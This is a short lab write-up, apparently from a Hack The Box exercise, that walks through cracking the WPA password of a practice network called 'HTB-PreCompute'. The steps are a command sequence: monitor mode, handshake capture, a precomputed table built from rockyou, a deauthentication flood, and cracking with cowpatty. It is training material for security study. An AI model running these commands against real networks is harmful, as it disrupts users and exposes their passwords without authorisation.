# [Precomputation (Rainbow Table) Attack](Precomputation%20(Rainbow%20Table)%20Attack.md)
### Perform the precomputation attack as demonstrated in this section to compromise the Wi-Fi network named "HTB-PreCompute". What is the password for this network?

```sh
sudo -s

airmon-ng start wlan0
```

![](Screenshot%202026-10-06%20at%2008.37.39.png)

```sh
airodump-ng wlan0mon -c 1 -w WPA
```

![](Screenshot%202026-10-06%20at%2008.39.13.png)

```sh
genpmk -f /opt/rockyou.txt -d htb-precompute.db -s HTB-PreCompute
```

![](Screenshot%202026-10-06%20at%2008.45.15.png)

```sh
aireplay-ng -0 5 -a D8:D3:34:EB:23:D5 -c 02:00:00:00:05:00 wlan0mon
```

![](Screenshot%202026-10-06%20at%2008.44.34.png)

```sh
cowpatty -d htb-precompute.db -r WPA-01.cap -s HTB-PreCompute
```

![](Screenshot%202026-10-06%20at%2008.46.34.png)
